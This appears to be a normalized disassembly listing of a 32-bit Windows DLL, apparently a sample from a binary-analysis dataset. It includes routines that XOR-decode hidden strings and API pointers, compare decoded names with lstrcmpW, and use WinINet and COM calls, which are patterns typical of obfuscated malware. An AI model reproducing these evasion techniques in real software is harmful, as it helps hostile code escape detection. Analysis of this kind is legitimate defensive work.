add edi edi
mov eax [ ecx + edi ]
mov edx [ eax + 0x28 ]
cmp edx [ eax + 0x2c ]
jne r-xdata
lea ecx [ ebp - 0xc0 ]
call sub_1004c8c0
xor eax eax
nop
mov esi [ ebp - 0x100 ]
push eax
lea esi [ ebp - 0x34 ]
call sub_1001b650
mov edx [ ebp - 0x108 ]
lea ecx [ ebx + 0xa0 ]
push ecx
mov ecx eax
mov [ ebp - 0x4 ] 0x3
call sub_10044b50
lea ecx [ ebp - 0x34 ]
mov esi eax
mov [ ebp - 0x4 ] 0x1
call sub_1004c8c0
cmp esi 0x43
je r-xdata
mov ebx [ ebp - 0x10c ]
mov ecx [ ebx + 0xc4 ]
lea esi [ ebx + 0xc4 ]
lea edi [ edx * 4 ]
mov eax [ edi + ecx ]
mov ecx [ eax + 0x2c ]
mov eax [ eax + 0x24 ]
mov edx [ ebp - 0x128 ]
push ecx
mov ecx [ ebp - 0x12c ]
push ebx
mov ebx eax
mov [ ebp - 0x104 ] esi
call sub_10069f10
lea edx [ ebp - 0x38 ]
mov eax 0x33
call sub_10072600
mov eax [ esi ]
mov edx [ eax + edi ]
mov eax [ edx + 0x4 ]
push eax
lea eax [ ebp - 0xf8 ]
push eax
call sub_1005f2b0
push eax
lea edx [ ebp - 0x38 ]
lea esi [ ebp - 0xdc ]
mov [ ebp - 0x4 ] 0x6
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0xcf
mov [ ebp - 0x4 ] 0x7
call sub_100205a0
mov ecx esi
call sub_10019100
lea ecx [ ebp - 0xf8 ]
call sub_10019100
mov ebx [ ebp - 0x104 ]
mov ecx [ ebx ]
mov esi [ edi + ecx ]
test esi esi
je r-xdata
push ecx
lea esi [ ebp - 0xdc ]
call sub_1001b650
mov ecx [ ebp - 0x10c ]
mov edx [ ebp - 0x108 ]
add ecx 0xa0
push ecx
mov ecx eax
mov [ ebp - 0x4 ] 0x8
call sub_10063d20
lea ecx [ ebp - 0xdc ]
mov esi eax
mov [ ebp - 0x4 ] 0x0
call sub_1004c8c0
cmp esi 0x43
je r-xdata
mov eax [ ebp - 0x108 ]
mov [ eax + 0xd4 ] 0x0
jmp r-xdata
lea edx [ ebp - 0xf8 ]
mov eax 0x18
call sub_10072600
mov eax [ ebx + 0xc4 ]
mov ecx [ eax + edi ]
mov eax [ ecx + 0x4 ]
push eax
lea edx [ ebp - 0xdc ]
push edx
call sub_1005f2b0
push eax
lea edx [ ebp - 0xf8 ]
lea esi [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x4
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0xcf
mov [ ebp - 0x4 ] 0x5
call sub_100205a0
mov ecx esi
call sub_10019100
lea ecx [ ebp - 0xdc ]
mov [ ebp - 0x4 ] 0x1
call sub_10019100
mov eax [ ebx ]
add eax edi
push eax
lea edi [ ebp - 0x134 ]
mov esi ebx
call sub_10047220
lea ecx [ ebp - 0xc0 ]
call sub_1004c8c0
mov eax 0x1
jmp r-xdata
call sub_10059b00
mov eax [ ebp - 0x108 ]
lea ecx [ ebp - 0xc0 ]
mov [ eax + 0xd4 ] 0x0
mov [ ebp - 0xf9 ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
call sub_1004c8c0
mov ebx [ ebp - 0x10c ]
jmp r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0x16
call sub_10072600
mov eax [ ebx + 0xc4 ]
mov eax [ eax + edi ]
mov eax [ eax + 0x4 ]
push eax
lea ecx [ ebp - 0xf8 ]
push ecx
call sub_1005f2b0
push eax
lea edx [ ebp - 0xa4 ]
lea esi [ ebp - 0xdc ]
mov [ ebp - 0x4 ] 0x9
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0xcf
mov [ ebp - 0x4 ] 0xa
call sub_100205a0
mov ecx esi
call sub_10019100
lea ecx [ ebp - 0xf8 ]
mov [ ebp - 0x4 ] 0x0
call sub_10019100
mov edx [ ebx + 0xc4 ]
mov esi [ edi + edx ]
test esi esi
je r-xdata
mov eax [ ebx + 0xc4 ]
add eax edi
push eax
lea edi [ ebp - 0x134 ]
lea esi [ ebx + 0xc4 ]
call sub_10047220
mov eax [ ebx + 0xc4 ]
mov edx [ ebx + 0xc8 ]
mov ecx [ ebp - 0x100 ]
sub edx eax
inc ecx
sar edx 0x2
mov [ ebp - 0x100 ] ecx
cmp ecx edx
jae r-xdata
call sub_10059b00
mov edx ecx
jmp r-xdata
lea edi [ edx * 4 ]
mov ecx [ edi + eax ]
mov esi [ ecx + 0x28 ]
cmp esi [ ecx + 0x2c ]
je r-xdata
sub_1002c57b
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_10069ac6
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1002c599
mov edi edi
push ebp
mov ebp esp
jmp r-xdata
cmp [ ebp + 0x18 ] 0x0
ja r-xdata
mov eax [ ebp + 0x14 ]
movzx eax [ eax ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002d770
dec [ ebp + 0x18 ]
add [ ebp + 0x14 ] 0x2
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
sub_1002c5cc
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0xc ]
call sub_1001366b
pop ecx
push eax
push r--data
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call sub_10001000
mov eax [ ebp + 0x8 ]
leave
retn 0x8
sub_1002c612
push 0x4c
mov eax sub_10085e7f
call sub_1003fae8
mov edi [ ebp + 0x8 ]
and [ ebp - 0x30 ] 0x0
mov ebx [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
inc eax
call sub_1004642f
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x10
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp - 0x34 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_10042ed5
cmp [ eax + 0x14 ] 0x10
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x30 ] 0x1
jb r-xdata
test [ ebp - 0x30 ] 0x1
je r-xdata
and [ ebp - 0x30 ] 0xfffffffd
lea ecx [ ebp - 0x58 ]
call sub_1001c8b0
push eax
lea ecx [ ebp - 0x58 ]
call sub_100120f0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x30 ] 0x3
mov [ esi ] r--data
call sub_100554b0
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov eax [ eax ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1002c8c0
push 0x2
pop eax
mov [ ebp - 0x4 ] eax
mov [ edi ] esi
test [ ebp - 0x30 ] al
je r-xdata
sub_1002c6d0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
lea ecx [ eax + eax ]
mov eax [ ebp + 0x8 ]
push ecx
push edx
push eax
call sub_1007ec90
add esp 0xc
pop ebp
retn
sub_1002c6ec
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10031581
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
pop ecx
sub_1002c710
push ebp
mov ebp esp
push 0xffffffff
push sub_10087ad0
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov ecx [ ebx + 0x4 ]
sub ecx [ ebx ]
mov eax 0x38e38e39
imul ecx
sar edx 0x3
mov edi edx
mov eax 0x0
shr edi 0x1f
add edi edx
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp edi 0x71c71c7
jbe r-xdata
mov ecx edi
call sub_100627e0
lea ecx [ edi + edi * 8 ]
lea edx [ eax + ecx * 4 ]
mov [ esi + 0x8 ] edx
mov [ ebp - 0x4 ] 0x0
mov edx [ ebp + 0x8 ]
push edx
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov ecx [ ebx + 0x4 ]
mov ebx [ ebx ]
push eax
push ecx
push ebx
call sub_10062840
add esp 0x10
mov [ esi + 0x4 ] eax
push r--data
call sub_1000831a
sub_1002c7e0
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
push ebx
mov ebx ecx
mov ecx [ ebx + 0x4 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
push esi
mov esi ecx
mov cl 0x1
push edi
mov [ ebp - 0x4 ] cl
jne r-xdata
mov edi esi
mov [ ebp + 0x10 ] edi
test cl cl
je r-xdata
mov edi [ edx + 0xc ]
mov eax [ edi + 0xc ]
push edx
cmp eax [ edx + 0xc ]
jae r-xdata
mov eax [ ebx + 0x4 ]
lea ecx [ ebp + 0x10 ]
cmp esi [ eax ]
jne r-xdata
cmp edi [ eax + 0xc ]
setb cl
cmp [ eax + 0xc ] edi
setae cl
jmp r-xdata
call sub_100187af
mov eax [ ebp + 0x8 ]
add esp 0x4
mov [ eax ] edi
pop edi
pop esi
mov [ eax + 0x4 ] 0x0
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp - 0x4 ]
push esi
push ecx
lea edx [ ebp + 0x10 ]
push edx
mov ecx ebx
call sub_10006840
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x1
pop ebx
mov esp ebp
pop ebp
retn 0xc
call sub_10012040
mov edi [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
push edx
push esi
push 0x1
push ecx
mov ecx ebx
call sub_10006840
mov edx [ eax ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
mov [ eax ] edx
mov [ eax + 0x4 ] 0x1
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax [ eax + 0x8 ]
mov eax [ eax ]
jmp r-xdata
mov [ ebp - 0x4 ] cl
test cl cl
je r-xdata
cmp [ ebp + 0x10 ] 0x0
mov esi eax
je r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_1002c8c0
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
je r-xdata
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0xf
mov [ edi + esi ] 0x0
pop edi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push ebx
mov ebx [ esi ]
test edi edi
je r-xdata
push ebx
call sub_100187af
add esp 0x4
pop ebx
push edi
push ebx
push esi
call sub_1007f5d0
add esp 0xc
sub_1002c910
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x28
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
push ebx
mov [ esp + 0x18 ] ecx
mov ecx [ ebp + 0x10 ]
push esi
xor eax eax
mov [ esp + 0x20 ] edx
mov edx [ ebp + 0x14 ]
mov [ esp + 0x24 ] ecx
mov ecx [ ebp + 0x18 ]
mov bl 0x38
push eax
mov [ esp + 0x2c ] edx
mov edx [ rw-data ]
mov [ esp + 0xc ] edx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
mov [ esp + 0x30 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x10 ] ecx
mov ecx [ esp + 0xc ]
xor [ esp + 0x10 ] bl
xor [ esp + 0x11 ] bl
xor [ esp + 0x12 ] bl
xor [ esp + 0x13 ] bl
push eax
lea edx [ esp + 0x18 ]
push edx
push ecx
push eax
push eax
mov [ esp + 0x28 ] 0x3
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] eax
call [ esp + 0x24 ]
mov edx [ rw-data ]
mov [ esp + 0xc ] edx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
mov esi eax
push 0xffffffff
push esi
call [ esp + 0x14 ]
mov eax [ rw-data ]
mov [ esp + 0xc ] eax
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
push esi
call [ esp + 0x10 ]
mov ecx [ rw-data ]
mov edx [ esp + 0x14 ]
mov [ esp + 0xc ] ecx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
push edx
call [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_1002ca08
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_100109dd
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
and [ esi + 0x4 ] 0x0
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_10041a47
pop ecx
push eax
call sub_1003de13
add esp 0xc
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_10041a47
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi ]
dec [ esi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rw-data
push esi
call sub_10041a47
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop esi
pop ebp
retn
test eax 0x400
jne r-xdata
or [ esi + 0xc ] 0x2000
push edi
push esi
call sub_10041a47
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_10041a47
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
pop edi
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_1002cb30
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ esi + 0x4 ] 0x0
mov [ esi ] 0x0
pop esi
retn
push eax
call [ InternetCloseHandle@IAT ]
sub_1002cb70
push ebp
mov ebp esp
xor eax eax
test ecx ecx
je r-xdata
mov eax 0x80070057
cmp ecx 0x7fffffff
jbe r-xdata
pop ebp
retn
push esi
push edi
lea esi [ ecx - 0x1 ]
mov ecx [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
push ecx
push esi
push ebx
xor edi edi
call sub_10044a29
add esp 0x10
test eax eax
js r-xdata
test eax eax
js r-xdata
xor eax eax
mov [ ebx + esi * 2 ] ax
mov edi 0x8007007a
cmp eax esi
ja r-xdata
jne r-xdata
mov eax edi
pop edi
pop esi
xor edx edx
mov eax edi
pop edi
mov [ ebx + esi * 2 ] dx
pop esi
pop ebp
retn
sub_1002cc00
push ebp
mov ebp esp
cmp edi [ ebp + 0x8 ]
je r-xdata
mov eax edi
pop ebp
retn 0x4
mov eax [ edi + 0x4 ]
dec [ eax ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ edi ] ecx
mov eax [ eax + 0x4 ]
mov [ edi + 0x4 ] eax
inc [ eax ]
push ebx
mov ebx [ HeapFree@IAT ]
push esi
mov esi [ edi ]
test esi esi
je r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax esi
call sub_1001f5f0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call ebx
pop esi
pop ebx
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call ebx
sub_1002cc5a
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10019f16
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_1002cd00
push ebp
mov ebp esp
sub esp 0xe0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfff0
and edx 0xff
mov [ ebp + eax * 2 - 0xc ] dx
inc eax
cmp eax 0x3
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x6 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffed
and edx 0xff
mov [ ebp + eax * 2 - 0x64 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x58 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffde
and edx 0xff
mov [ ebp + eax * 2 - 0x74 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x68 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x2d
and edx 0xff
mov [ ebp + eax * 2 - 0x18 ] dx
inc eax
cmp eax 0x4
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x10 ] ax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x49
and edx 0xff
mov [ ebp + eax * 2 - 0x24 ] dx
inc eax
cmp eax 0x5
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x1a ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x59
and edx 0xff
mov [ ebp + eax * 2 - 0x34 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x28 ] ax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x2e
and edx 0xff
mov [ ebp + eax * 2 - 0xa4 ] dx
inc eax
cmp eax 0xc
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x8c ] ax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffcc
and edx 0xff
mov [ ebp + eax * 2 - 0x54 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x48 ] ax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffd7
and edx 0xff
mov [ ebp + eax * 2 - 0xe0 ] dx
inc eax
cmp eax 0xe
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0xc4 ] ax
nop
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x51
and edx 0xff
mov [ ebp + eax * 2 - 0x88 ] dx
inc eax
cmp eax 0x8
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x78 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x53
and edx 0xff
mov [ ebp + eax * 2 - 0x44 ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x38 ] ax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x22
and edx 0xff
mov [ ebp + eax * 2 - 0xc0 ] dx
inc eax
cmp eax 0xd
jb r-xdata
xor eax eax
mov [ ebp - 0xa6 ] ax
mov eax [ ebp + 0x8 ]
dec eax
push esi
cmp eax 0x5
ja r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
jmp [ eax * 4 + jump_table_1002d118 ]
mov esi [ lstrcmpW@IAT ]
lea ecx [ ebp - 0xc ]
push ecx
push edi
call esi
test eax eax
je r-xdata
mov esi [ lstrcmpW@IAT ]
lea ecx [ ebp - 0xc ]
push ecx
push edi
call esi
test eax eax
jne r-xdata
mov esi [ lstrcmpW@IAT ]
lea ecx [ ebp - 0x34 ]
push ecx
push edi
call esi
test eax eax
jne r-xdata
mov esi [ lstrcmpW@IAT ]
lea eax [ ebp - 0x44 ]
push eax
push edi
call esi
test eax eax
jne r-xdata
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x24 ]
push edx
push edi
call esi
test eax eax
je r-xdata
lea edx [ ebp - 0x64 ]
push edx
push edi
call esi
test eax eax
jne r-xdata
mov eax 0x7
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0xa4 ]
push edx
push edi
call esi
test eax eax
jne r-xdata
mov eax 0x3
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x88 ]
push ecx
push edi
call esi
test eax eax
jne r-xdata
mov eax 0xa
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x18 ]
push eax
push edi
call esi
test eax eax
jne r-xdata
lea eax [ ebp - 0x74 ]
push eax
push edi
call esi
test eax eax
jne r-xdata
mov eax 0x8
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x54 ]
push eax
push edi
call esi
test eax eax
jne r-xdata
mov eax 0x4
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov eax 0xb
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov eax 0x9
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0xe0 ]
push ecx
push edi
call esi
test eax eax
jne r-xdata
mov eax 0x5
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0xc0 ]
push edx
push edi
call esi
test eax eax
jne r-xdata
mov eax 0x6
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov eax 0xc
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
sub_1002d130
push ebp
mov ebp esp
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
push edi
xor edi edi
mov [ ebp - 0x80 ] edi
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x52
and edx 0xff
mov [ ebp + eax * 2 - 0x2c ] dx
inc eax
cmp eax 0xd
jb r-xdata
xor eax eax
lea edx [ ebp - 0x80 ]
push edx
mov [ ebp - 0x12 ] ax
mov eax [ esi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x2c ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0x80 ]
lea edx [ ebp - 0x7c ]
mov [ ebp - 0x7c ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
test eax eax
jns r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x40 ]
mov eax 0x8d
mov [ ebp - 0x78 ] edi
call sub_10053240
mov eax [ ebp - 0x7c ]
mov ecx [ eax ]
lea edx [ ebp - 0x78 ]
push edx
lea edx [ ebp - 0x40 ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
mov eax [ ebp - 0x78 ]
mov edx [ esi + 0x120 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x6c ]
call eax
lea edx [ ebp - 0x10 ]
mov eax 0x12e
mov [ ebp - 0x78 ] edi
call sub_10053240
mov eax [ ebp - 0x7c ]
mov ecx [ eax ]
lea edx [ ebp - 0x78 ]
push edx
lea edx [ ebp - 0x10 ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
mov eax [ ebp - 0x78 ]
mov edx [ esi + 0x124 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x6c ]
call eax
lea edx [ ebp - 0x74 ]
mov eax 0xe
call sub_10053240
jmp r-xdata
mov eax [ ebp - 0x80 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop edi
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x7c ] edi
mov eax [ ebp - 0x7c ]
cmp eax edi
je r-xdata
sub_1002d260
push ebp
mov ebp esp
push 0xffffffff
push sub_10086269
mov eax [ fs : 0x0 ]
push eax
sub esp 0xa8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor edi edi
push edi
push edi
call [ CoInitializeEx@IAT ]
test eax eax
jns r-xdata
lea eax [ ebp - 0x20 ]
push eax
push r--data
push 0x1
push edi
push r--data
mov [ ebp - 0x20 ] edi
call [ CoCreateInstance@IAT ]
cmp eax edi
jge r-xdata
lea eax [ edi + 0x1 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ VariantInit@IAT ]
lea ecx [ ebp - 0x4c ]
push ecx
call esi
mov [ ebp - 0x4 ] edi
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x40 ]
mov edi [ ebp - 0x4c ]
mov ebx [ ebp - 0x48 ]
lea ecx [ ebp - 0xa4 ]
push ecx
mov [ ebp - 0xac ] edx
mov [ ebp - 0xa8 ] eax
call esi
mov eax [ ebp - 0xa0 ]
mov edx [ ebp - 0xa4 ]
mov ecx [ ebp - 0x9c ]
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x5c ] edx
mov edx [ ebp - 0x98 ]
lea eax [ ebp - 0x94 ]
push eax
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x50 ] edx
call esi
mov edx [ ebp - 0x90 ]
mov ecx [ ebp - 0x94 ]
mov eax [ ebp - 0x8c ]
mov [ ebp - 0x68 ] edx
mov [ ebp - 0x6c ] ecx
mov ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x84 ]
push edx
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x60 ] ecx
call esi
mov [ ebp - 0x4 ] 0x3
mov esi [ ebp - 0xac ]
sub esp 0x10
mov eax esp
mov [ eax ] edi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0xa8 ]
mov [ eax + 0xc ] esi
mov esi [ ebp - 0x5c ]
sub esp 0x10
mov eax esp
mov [ eax ] esi
mov esi [ ebp - 0x58 ]
mov [ eax + 0x4 ] esi
mov esi [ ebp - 0x54 ]
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x50 ]
mov [ eax + 0xc ] esi
mov esi [ ebp - 0x6c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ecx ]
sub esp 0x10
mov eax esp
mov [ eax ] esi
mov esi [ ebp - 0x68 ]
mov [ eax + 0x4 ] esi
